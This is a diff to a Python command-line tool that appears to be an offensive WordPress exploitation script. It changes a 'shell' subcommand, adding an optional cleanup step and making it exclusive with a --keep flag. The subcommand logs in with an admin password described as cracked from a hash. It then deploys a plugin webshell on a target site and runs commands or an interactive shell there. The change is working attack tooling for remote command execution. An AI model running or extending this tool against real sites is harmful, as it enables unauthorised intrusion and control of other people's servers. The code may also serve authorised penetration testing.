@@ -213,34 +213,49 @@ def cmd_shell(args: argparse.Namespace) -> int:
     good(f"Webshell: {args.url.rstrip('/')}{path}")
 
     rc = 0
-    if args.cmd:
-        output = session.run(path, args.cmd)
-        if output is None:
-            bad("No output — the upload likely failed (nonce/permissions) or the plugin is not web-served.")
-            rc = 1
-        else:
-            print()
-            print(output.rstrip("\n"))
-            print()
+    try:
+        if args.cmd:
+            output = session.run(path, args.cmd)
+            if output is None:
+                bad("No output — the upload likely failed (nonce/permissions) or the plugin is not web-served.")
+                rc = 1
+            else:
+                print()
+                print(output.rstrip("\n"))
+                print()
 
-    if args.interactive:
-        _repl(session, path)
-
-    if not args.keep:
-        warn(f"Remove the webshell when finished (delete {path} on the target).")
+        if args.interactive:
+            _repl(session, path)
+    finally:
+        if args.cleanup:
+            info("Cleaning up webshell...")
+            try:
+                removed = session.cleanup(path)
+            except Exception as exc:  # noqa: BLE001 - cleanup must not hide the original failure
+                bad(f"Cleanup failed ({exc}) — remove the plugin manually ({path}).")
+                rc = 1
+            else:
+                if removed:
+                    good("Webshell removed from the target.")
+                else:
+                    bad(f"Cleanup failed — remove the plugin manually ({path}).")
+                    rc = 1
+        elif not args.keep:
+            warn(f"Remove the webshell when finished (delete {path} on the target).")
     return rc
 
 
 # -- parser -----------------------------------------------------------------
 
 
-def _add_common(parser: argparse.ArgumentParser) -> None:
+def _add_common(parser: argparse.ArgumentParser, *, rest_route: bool = True) -> None:
     parser.add_argument("url", help="target base URL, e.g. http://target")
-    parser.add_argument(
-        "--rest-route",
-        action="store_true",
-        help="use /?rest_route=/batch/v1 instead of /wp-json/batch/v1",
-    )
+    if rest_route:
+        parser.add_argument(
+            "--rest-route",
+            action="store_true",
+            help="use /?rest_route=/batch/v1 instead of /wp-json/batch/v1",
+        )
     parser.add_argument("--timeout", type=float, default=30.0, help="request timeout (default: 30)")
     parser.add_argument("--proxy", help="HTTP proxy, e.g. http://127.0.0.1:8080")
 
@@ -279,13 +294,17 @@ def build_parser() -> argparse.ArgumentParser:
     read.set_defaults(func=cmd_read)
 
     shell = sub.add_parser("shell", help="post-auth plugin webshell helper")
-    _add_common(shell)
+    _add_common(shell, rest_route=False)  # shell uses wp-login/wp-admin directly, not the REST API
     shell.add_argument("--user", required=True, help="admin username")
     shell.add_argument("--password", required=True, help="admin password (cracked from the hash)")
     shell.add_argument("--cmd", help="command to run on the target (omit when using --interactive)")
     shell.add_argument("-i", "--interactive", action="store_true",
                        help="open an interactive shell after deploying")
-    shell.add_argument("--keep", action="store_true", help="do not warn about removing the webshell")
+    retention = shell.add_mutually_exclusive_group()
+    retention.add_argument("--keep", action="store_true",
+                           help="do not warn about removing the webshell")
+    retention.add_argument("--cleanup", action="store_true",
+                           help="delete the webshell from the target when finished")
     shell.set_defaults(func=cmd_shell)
 
     return parser
